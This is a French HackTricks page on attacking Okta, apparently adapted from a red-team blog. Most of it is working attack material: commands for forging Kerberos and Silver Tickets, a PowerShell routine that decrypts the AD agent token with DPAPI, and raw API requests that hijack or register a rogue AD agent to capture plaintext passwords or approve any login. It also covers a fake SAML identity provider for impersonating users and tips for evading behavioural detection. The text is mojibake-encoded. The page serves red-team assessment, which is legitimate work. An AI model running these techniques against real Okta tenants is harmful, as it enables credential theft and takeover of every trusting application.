# S√©curit√© d'Okta

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informations de base

Okta, Inc. est une entreprise de **gestion des identit√©s et des acc√®s** qui fournit des logiciels cloud pour aider les entreprises √† **g√©rer et s√©curiser l'authentification des utilisateurs dans les applications modernes**, et pour les d√©veloppeurs √† int√©grer des contr√¥les d'identit√© dans les applications, les services web et les appareils.

Leur service principal, appel√© Okta Identity Cloud, propose des produits qui incluent l'authentification unique (SSO), l'authentification multi-facteurs (MFA), la gestion du cycle de vie, l'annuaire universel, la gestion de l'acc√®s aux API, et plus encore. Cela permet aux entreprises de prot√©ger leurs donn√©es sensibles et de faciliter l'acc√®s des utilisateurs, rendant les applications et les services plus accessibles et faciles √† utiliser pour les employ√©s ou les clients.

Les services d'Okta sont largement utilis√©s dans des contextes d'entreprise, ainsi que par des petites entreprises et des d√©veloppeurs. Elle joue un r√¥le crucial dans la possibilit√© pour les entreprises d'adopter et de g√©rer de mani√®re s√©curis√©e les technologies cloud. √Ä ma connaissance en septembre 2021, Okta reste un acteur important de l'industrie de la gestion des identit√©s et des acc√®s (IAM).

{% hint style="danger" %}
L'objectif principal d'Okta est de configurer l'acc√®s de diff√©rents utilisateurs et groupes √† des applications externes. Si vous parvenez √† **compromettre les privil√®ges d'administrateur dans un environnement Okta**, vous pourrez tr√®s probablement **compromettre toutes les autres plateformes utilis√©es par l'entreprise**.
{% endhint %}

{% hint style="success" %}
Pour effectuer une analyse de s√©curit√© d'un environnement Okta, vous devriez demander un **acc√®s en lecture seule en tant qu'administrateur**.
{% endhint %}

### R√©sum√©

Il y a des **utilisateurs** (qui peuvent √™tre **stock√©s dans Okta**, connect√©s √† partir de **fournisseurs d'identit√©** configur√©s ou authentifi√©s via **Active Directory** ou LDAP). \
Ces utilisateurs peuvent √™tre regroup√©s dans des **groupes**.\
Il y a aussi des **authentificateurs** : diff√©rentes options d'authentification comme le mot de passe, et plusieurs 2FA comme WebAuthn, e-mail, t√©l√©phone, Okta Verify (ils peuvent √™tre activ√©s ou d√©sactiv√©s)...

Ensuite, il y a des **applications** synchronis√©es avec Okta. Chaque application aura une **correspondance avec Okta** pour partager des informations (telles que les adresses e-mail, les pr√©noms...). De plus, chaque application doit √™tre incluse dans une **politique d'authentification**, qui indique les **authentificateurs n√©cessaires** pour qu'un utilisateur puisse **acc√©der** √† l'application.

{% hint style="danger" %}
Le r√¥le le plus puissant est celui de **Super Administrateur**.

Si un attaquant compromet Okta avec un acc√®s administrateur, toutes les **applications faisant confiance √† Okta** seront tr√®s probablement **compromises**.
{% endhint %}

## Attaques

### Localisation du portail Okta

G√©n√©ralement, le portail d'une entreprise se trouve √† l'adresse **companyname.okta.com**. Sinon, essayez des **variantes** simples de **companyname**. Si vous ne parvenez pas √† le trouver, il est √©galement possible que l'organisation dispose d'un enregistrement **CNAME** tel que **`okta.companyname.com`** pointant vers le portail Okta.

### Connexion √† Okta via Kerberos

(Attaque copi√©e [**ici**](https://trustedsec.com/blog/okta-for-red-teamers)).

Si un domaine comme **`companyname.kerberos.okta.com`** existe, alors Kerberos est configur√© au sein de l'entreprise pour acc√©der √† Okta. C'est tr√®s int√©ressant car les utilisateurs Windows n'auront g√©n√©ralement pas besoin de MFA pour acc√©der √† Okta.

Il est √©galement possible de trouver des utilisateurs Kerberos configur√©s avec un acc√®s Okta dans l'environnement AD en cours d'ex√©cution :
```bash
getST.py -spn HTTP/clientname.kerberos.okta.com -dc-ip 1.2.3.4 LAB/comprommiseduser
```
Avec un ticket r√©cup√©r√© pour l'utilisateur AD, nous devons l'injecter sur un h√¥te que nous contr√¥lons √† l'aide de Rubeus ou Mimikatz:

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Vous devez vous assurer que `clientname.kerberos.okta.com` est ajout√© √† la zone de s√©curit√© "Intranet" dans les Options Internet. Ensuite, dans notre navigateur, si nous acc√©dons √† l'URL ci-dessous, nous devrions constater que nous recevons une r√©ponse JSON fournissant un r√©sultat `OK` lorsque le ticket Kerberos est accept√©:

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

En allant sur le tableau de bord Okta, si tout est OK, vous serez connect√©.

De plus, si nous parvenons √† compromettre le compte de service Okta r√©el en exposant le SPN de d√©l√©gation, nous pouvons effectuer une attaque Silver Ticket.

Il convient de noter qu'Okta ne prend en charge que AES pour le chiffrement des tickets, nous devrons donc nous assurer d'avoir la cl√© AES ou le mot de passe en texte brut pour l'authentification:

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Pour cr√©er notre ticket pour l'utilisateur victime `testuser`, nous utilisons:

{% code overflow="wrap" %}
```bash
ticketer.py -domain-sid S-1-5-21-4170871944-1575468979-147100471 -domain lab.local -dc-ip DC01 -aesKey db22ab9c89f2f0d545024f9dfabbed44173397065d8f5b7e172200ca38ed4393 -user-id 1118 -spn HTTP/example.kerberos.okta.com testuser
```
{% endcode %}

Et encore une fois, envoyez ceci √† Okta via notre session de navigation :

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### D√©tournement de l'agent Okta AD

(Attaque copi√©e [**d'ici**](https://trustedsec.com/blog/okta-for-red-teamers)).

Si vous acc√©dez √† un serveur ex√©cutant l'agent Okta AD. Cet agent est responsable de la synchronisation des utilisateurs et des groupes de domaine vers Okta pour la provision, ainsi que de la r√©ponse aux demandes d'authentification d'Okta lorsque les utilisateurs se connectent au portail.

Par d√©faut, l'agent est install√© dans :
```bash
C:\Program Files (x86)\Okta\Okta AD Agent
```
Nous allons examiner le fichier `OktaAgentService.exe.config`, qui contient quelques √©l√©ments int√©ressants en XML :

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Le `AgentToken` encod√© en Base64 est notre objectif. Si nous ouvrons `OktaAgentService.exe` dans dnSpy, nous pouvons voir comment ces valeurs sont d√©crypt√©es :

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

C'est exact... bon vieux DPAPI ! La valeur `RandomEntropy` est d√©finie sur :

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Cela signifie que nous pouvons d√©crypter cette valeur XML encod√©e en Base64 en utilisant :
```powershell
Add-Type -AssemblyName 'System.Security'
$rand = [byte]174,53,167,191,10,250,125,232,223,147,248,86,65

$k = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String("AQAAANCMnd8BFdERjH..."), $rand, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::Unicode.GetString($k)
```
La cl√© ma√Ætre DPAPI utilis√©e appartient au compte utilisateur ex√©cutant le service "Okta AD Agent", vous devrez donc ex√©cuter ce qui pr√©c√®de dans le contexte du compte de service ou r√©cup√©rer la cl√© ma√Ætre du compte et la d√©crypter :

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Par exemple, dans `OktaAgentService.exe.config`, nous avons deux autres champs XML, `APPID` et `AGENTID`. En combinant cela avec le `AgentToken`, nous pouvons effectuer une requ√™te `GET` comme suit :
```xml
GET /api/1/internal/app/activedirectory/[APPID]/agent/[AGENTID]/nextAction?agentVersion=1&pollid=anything HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00OfIl_Gi1rZu1NETmHo6auU6YZEOEn8ZlDhyqstiZ
```
Cet appel sera bloqu√© jusqu'√† ce qu'un utilisateur s'authentifie sur Okta (ou que la demande expire), auquel cas il renverra le prochain nom d'utilisateur et mot de passe fournis en clair :
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<action>
<UserAuth actionId="rpc::app.active_directory.agent.reply.ok14-majorecs02a.auw2-ok14.internal//1670637714886//Y5PojoeQQ3KDgHHzA11P9wAAC8g:e9088489-99ff-435a-943b-b7dccc457cb5:">
<type>USER_AUTH</type>
<password>abc123</password>
<useLdapGroupPasswordPolicy>false</useLdapGroupPasswordPolicy>
<userName>domuser@lab.local</userName>
</UserAuth>
</action>
```
Bien que cela permette de capturer les informations d'identification, nous avons √©galement la possibilit√© de r√©pondre √† cette tentative d'authentification si nous souhaitons faire quelque chose comme fournir une cl√© universelle. Nous le faisons en √©mettant la requ√™te HTTP suivante :
```xml
POST /api/1/internal/app/activedirectory/0oa7c027u2tcjxoki697/agent/a537ca54okqfsuu0s697/actionResult?responseid=12345 HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00JFtjd...WgkeI1Eg5Y
Content-Type: application/xml; charset=utf-8
Content-Length: 1362

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" actionId="rpc::app.active_directory.agent.reply.ok14-majorecs04a.auw2-ok14.internal//1694301421033//ZPz86MzEBzhpMhSFWzyK5wAAA_Q:440a7d52-704b-4c1b-ac79-afdc241e3080:">
<type>USER_AUTH</type>
<status>SUCCESS</status>
<message></message>
<errorCode></errorCode>
<timestamps>
<actionRecieivedFromOkta>1694358076</actionRecieivedFromOkta>
<actionSentToLdapServer>1694358076</actionSentToLdapServer>
<responseReceivedFromLdapServer>1694358076</responseReceivedFromLdapServer>
<responseSentToOkta>1694358076</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>20230910150116.726Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>20230910150116.741Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>20230910150116.741Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910150116.741Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{{"ExecutionTime":"12","AgentUpTime":"0 day(s) 22:41:49","DC":"DC01.lab.local","DomainControllerFunctionality":"WIN2016","DomainFunctionality":"WIN2016","ForestFunctionality":"WIN2016","LdapResponseTime":"0"}}</additionalInfo>
</agentActionResult>
```
Le r√©sultat de cette requ√™te permet d'autoriser l'authentification pour n'importe quel utilisateur via Okta.

### D√©tournement de l'AD en tant qu'administrateur

(Attaque copi√©e [**√† partir d'ici**](https://trustedsec.com/blog/okta-for-red-teamers)).

Nous savons que nous pouvons d√©tourner un agent AD Okta en utilisant un jeton d'agent vol√©, mais que se passe-t-il si nous avons compromis un compte Okta privil√©gi√© et que nous voulons le faire sans avoir de jeton d'agent existant ? Voyons comment faire cela.

Tout d'abord, nous devons cr√©er un jeton d'API d'agent AD Okta. Pour d√©marrer le flux d'authentification, nous avons besoin d'un code OAuth. Pour l'obtenir, nous commen√ßons par nous rendre sur :

{% code overflow="wrap" %}
```
https://example.okta.com/oauth2/authorize?redirect_uri=%2Foauth-response&response_type=code&client_id=cappT0Hfy97F1BoO1UTR&prompt=select_account
```
{% endcode %}

Cela vous donnera une fen√™tre de permission √† accepter :

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

En acceptant la fen√™tre de permission pr√©sent√©e, vous serez redirig√© vers `/oauth-response` avec un param√®tre `code` :

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Nous devons prendre ce param√®tre `code` et demander un jeton d'API en utilisant la requ√™te POST :
```
POST /oauth2/token HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Content-Type: application/x-www-form-urlencoded
Host: example.okta.com
Content-Length: 65
Expect: 100-continue
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

grant_type=api_token&code=7vzn01sl&client_id=cappT0Hfy97F1BoO1UTR
```
La r√©ponse nous renvoie notre jeton API :
```
{"api_token":"00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd"}
```
√Ä l'aide de ce jeton, nous devons l'associer √† un domaine AD actif. Nous le faisons en utilisant l'appel API :
```
POST /api/1/internal/app/activedirectory/ HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Host: example.okta.com
Accept: application/xml; charset=UTF-8
Content-Type: application/xml; charset=UTF-8
Content-Length: 86
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<domain name="lab.local" />
```
Cela nous renverra la r√©ponse XML suivante, o√π nous devons conserver la valeur de l'attribut `id` pour plus tard.
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<activeDirectory id="0oa4jsza16ar1UdaW696">
<name>lab.local</name>
<newInstance>false</newInstance>
</activeDirectory>
```
Ensuite, nous effectuons un appel HTTP √† l'API pour nommer notre connecteur :
```
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent?name=DC02 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 0
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd
```
Cela renverra une r√©ponse XML o√π nous devons √† nouveau conserver l'attribut `id` :

{% code overflow="wrap" %}
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><agent id="a532camqiqXMhlOf5697"><name>DC02</name></agent>
```
{% endcode %}

Enfin, nous initialisons la connexion pour permettre la r√©ception des donn√©es :
```xml
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent/a532camqiqXMhlOf5697/actionResult?agentVersion=3.13.0.0 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 825
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<type>INIT</type>
<status>SUCCESS</status>
<timestamps>
<actionRecieivedFromOkta />
<actionSentToLdapServer />
<responseReceivedFromLdapServer />
<responseSentToOkta>1694304008</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>00010101000000.000Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>00010101000000.000Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>00010101000000.000Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910000008.174Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{}</additionalInfo>
</agentActionResult>
```
Avec cela fait, notre faux agent AD est maintenant pr√™t et traitera les tentatives d'authentification comme indiqu√© pr√©c√©demment.

√âvidemment, nous ne voulons pas faire tout cela en utilisant Burp, donc un outil a √©t√© cr√©√© pour prendre en charge quelques cas d'utilisation. Il est disponible [ici](https://github.com/xpn/OktaPostExToolkit).

Le premier mode dans lequel nous pouvons ex√©cuter cet outil est le mode `token`, qui prend une valeur de jeton d'agent compromis et se connectera √† l'API Okta, en extrayant toutes les informations d'identification qu'il re√ßoit :

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 token --api-token 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd --app-id 0oa7c027u2TcJxoki697 --agent-id a537cnm9ldwPILkqP697
```
{% endcode %}

Exemples vid√©o :

* [https://www.youtube.com/watch?v=ZYRcfj6jtaA](https://www.youtube.com/watch?v=ZYRcfj6jtaA)
* [https://youtu.be/Sob2u6xEjTE](https://youtu.be/Sob2u6xEjTE)

L'outil permet √©galement d'enregistrer un nouveau connecteur AD si nous disposons des identifiants d'administration d'un utilisateur Okta qui l'utilise :

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 oauth --machine-name DC01 --windows-domain lab.local --code OAUTH_CODE_HERE
```
{% endcode %}

### Fournisseur SAML Factice Okta

(Attaque copi√©e [**d'ici**](https://trustedsec.com/blog/okta-for-red-teamers)).

Une autre technique qui s'est av√©r√©e tr√®s utile lors des √©valuations est le d√©ploiement d'un fournisseur SAML factice.

R√©cemment, Okta a en fait fourni [une mise √† jour de s√©curit√©](https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection) sur les attaques en cours utilisant cette technique, il est donc certainement utile de conna√Ætre cette technique lors de la simulation d'activit√©s sur un environnement, en particulier pour les clients qui souhaitent tester leurs d√©tections de cette attaque particuli√®re.

Si nous avons acc√®s √† un compte Okta √©lev√©, nous pouvons d√©ployer un fournisseur d'identit√© externe dans le cadre de la fonctionnalit√© d'Okta. Cela permet aux fournisseurs externes comme Entra ID de terminer l'authentification avant de rediriger l'utilisateur vers Okta pour s√©lectionner les applications int√©gr√©es.

Mais que se passe-t-il si nous contr√¥lons l'IDP ? Eh bien, il est logique de penser que dans ce cas, nous pouvons approuver n'importe quelle demande d'authentification que nous voulons.

Pour tester cela, nous avons besoin d'un fournisseur d'identit√© personnalis√© √† d√©ployer. Un IDP SAML tr√®s bricol√© qui prend en charge nos activit√©s malveillantes peut √™tre trouv√© [ici](https://github.com/xpn/OktaPostExToolkit). L'id√©e principale derri√®re cet outil est de nous permettre d'√©mettre des r√©ponses d'authentification SAML sign√©es qui correspondent √† n'importe quel utilisateur que nous souhaitons.

Ce serveur √©coutera les requ√™tes HTTP entrantes sur `/saml`, nous devons donc d'abord d√©ployer un IDP sur Okta.

Tout d'abord, nous s√©lectionnons le fournisseur d'identit√© SAML 2.0 :

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Lors de la configuration de l'IDP, nous devons faire attention √† quelques param√®tres. Le premier est le `Nom`, qui est le nom convivial √† afficher √† tous les autres administrateurs d'Okta.

Ensuite, il y a l'URL de l'√©metteur, qui doit √™tre d√©finie sur la valeur d'un identifiant au format URI. Encore une fois, cela peut √™tre n'importe quoi, mais nous utiliserons `https://www.example.com/`.

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Nous devons √©galement d√©finir le champ `URL de connexion unique de l'IDP` sur l'emplacement o√π notre serveur SAML est en cours d'ex√©cution. Maintenant, la chose int√©ressante est que cela N'A PAS besoin d'√™tre une URL qui pointe vers notre serveur. Je pense que cela vaut la peine de le souligner car nous pouvons √™tre tr√®s cr√©atifs dans l'URL que nous saisissons ici et rendre un peu plus difficile la t√¢che de l'√©quipe Blue. Par exemple, nous pouvons d√©finir ce champ sur quelque chose comme `https://idp.google.com/saml` si nous le souhaitons, et la seule chose que nous devons pouvoir faire est de capturer la demande SAML entrante. Voici la chose int√©ressante : la demande SAML est transmise c√¥t√© client. Par l√†, je veux dire qu'Okta g√©n√©rera la `AuthRequest` SAML et fera rediriger notre navigateur vers `https://idp.google.com/` avec la demande SAML. Cela signifie bien s√ªr que nous pouvons simplement modifier le fichier hosts local pour pointer `idp.google.com` vers `127.0.0.1` :
```bash
echo '127.0.0.1 idp.google.com' | sudo tee -a /etc/hosts
```
Nous avons √©galement besoin d'un certificat de signature que nous contr√¥lons. Celui-ci peut √™tre auto-sign√© et g√©n√©r√© √† l'aide d'OpenSSL avec :

{% code overflow="wrap" %}
```bash
openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes -keyout example.com.key -out example.com.crt
```
{% endcode %}

Encore une fois, vous pouvez faire preuve de cr√©ativit√©, car il n'y a pas d'exigences sp√©cifiques en mati√®re d'authenticit√© de ce certificat.

Une fois la cl√© g√©n√©r√©e, nous t√©l√©chargeons simplement le certificat sur Okta et cr√©ons notre IDP.

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Enfin, nous devons nous assurer que `Match Against` est d√©fini sur `Okta Username or Email` et que `Account Link Policy` est d√©fini sur `Automatic` pour nous permettre de nous authentifier aupr√®s des comptes Okta existants :

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Une fois tout sauvegard√©, nous devons t√©l√©charger les m√©tadonn√©es :

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Ensuite, pour initier la demande d'authentification et √©mettre l'`AuthRequest`, nous nous rendons √† l'URL indiqu√©e dans `Assertion Consumer Service URL` :

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

L'acc√®s √† cette URL entra√Æne une redirection vers notre serveur SAML interne :

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Si nous fournissons une adresse e-mail, nous constatons que nous pouvons nous authentifier en tant qu'utilisateur Okta sans avoir besoin de conna√Ætre leurs identifiants.

Voyons cela en action dans [https://youtu.be/uw1hlKNDG2c](https://youtu.be/uw1hlKNDG2c)

### Phishing du portail Okta avec Evilgnix

Dans [**cet article de blog**](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23), il est expliqu√© comment pr√©parer une campagne de phishing contre un portail Okta.

### Attaque d'usurpation de coll√®gue

Les **attributs que chaque utilisateur peut avoir et modifier** (comme l'e-mail ou le pr√©nom) peuvent √™tre configur√©s dans Okta. Si une **application** fait **confiance** √† un **attribut** en tant qu'ID que l'utilisateur peut **modifier**, il pourra **usurper d'autres utilisateurs sur cette plateforme**.

Par cons√©quent, si l'application fait confiance au champ **`userName`**, vous ne pourrez probablement pas le modifier (car vous ne pouvez g√©n√©ralement pas modifier ce champ), mais si elle fait confiance par exemple √† **`primaryEmail`**, vous pourriez √™tre en mesure de le **modifier pour l'adresse e-mail d'un coll√®gue** et vous faire passer pour lui (vous devrez avoir acc√®s √† l'e-mail et accepter la modification).

Notez que cette usurpation d√©pend de la configuration de chaque application. Seules celles qui font confiance au champ que vous avez modifi√© et qui acceptent les mises √† jour seront compromises.\
Par cons√©quent, l'application doit avoir ce champ activ√© s'il existe :

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

J'ai √©galement vu d'autres applications qui √©taient vuln√©rables mais qui n'avaient pas ce champ dans les param√®tres Okta (au final, les diff√©rentes applications sont configur√©es diff√©remment).

La meilleure fa√ßon de savoir si vous pouvez vous faire passer pour quelqu'un sur chaque application serait de l'essayer !

## √âviter les politiques de d√©tection comportementale <a href="#9fde" id="9fde"></a>

√Ä moins qu'il n'ait √©t√© divulgu√© √† l'avance, vous ne saurez probablement pas si des politiques de d√©tection comportementale ont √©t√© mises en ≈ìuvre avant de les rencontrer. Une **m√©thode potentielle pour contourner les politiques de d√©tection comportementale d'Okta** consiste simplement √† **√©viter le tableau de bord principal d'Okta** et √† cibler directement les applications Okta (ce sont les applications dans la capture d'√©cran ci-dessus qui sont masqu√©es par des bo√Ætes rouges). Si vous √™tes en possession d'un jeton d'acc√®s Okta, au lieu de rejouer le jeton sur la page de connexion principale d'Okta de votre entreprise cible, vous le rejouerez sur l'URL sp√©cifique √† l'application Okta.

D'autres recommandations sont les suivantes :

* Faites attention lorsque vous rejouez des jetons d'acc√®s captur√©s √† partir de proxys anonymiseurs populaires et de services VPN.
* Lorsque vous rejouez un jeton d'acc√®s, utilisez la m√™me cha√Æne d'agent utilisateur que celle utilis√©e par le client.
* Faites attention lorsque vous rejouez des jetons d'acc√®s captur√©s provenant d'utilisateurs distincts de la m√™me adresse IP.
* Faites attention lorsque vous rejouez des jetons d'acc√®s captur√©s contre le tableau de bord Okta.
* Si vous connaissez les adresses IP des entreprises que les victimes utiliseront, envisagez de bloquer tout autre trafic que cette adresse IP ou cette plage d'adresses IP.

## Renforcement d'Okta

Okta dispose de nombreuses configurations possibles. Sur cette page, vous trouverez comment les examiner pour les rendre aussi s√©curis√©es que possible :

{% content-ref url="okta-hardening.md" %}
[okta-hardening.md](okta-hardening.md)
{% endcontent-ref %}

## R√©f√©rences

* [https://trustedsec.com/blog/okta-for-red-teamers](https://trustedsec.com/blog/okta-for-red-teamers)
* [https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) **et** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos.**

</details>
